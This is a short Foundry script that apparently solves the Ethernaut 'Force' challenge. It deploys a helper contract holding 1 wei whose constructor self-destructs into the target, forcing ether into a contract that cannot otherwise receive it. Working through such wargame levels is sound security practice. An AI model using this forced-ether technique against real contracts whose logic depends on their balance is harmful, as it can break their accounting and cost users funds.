// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address payable force = payable(vm.envAddress("FORCE_INSTANCE"));

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));
        
        new Player{value: 1 wei}(force);

        vm.stopBroadcast();
    }
}

contract Player {
    constructor(address payable instance) payable {
        selfdestruct(instance);
    }
}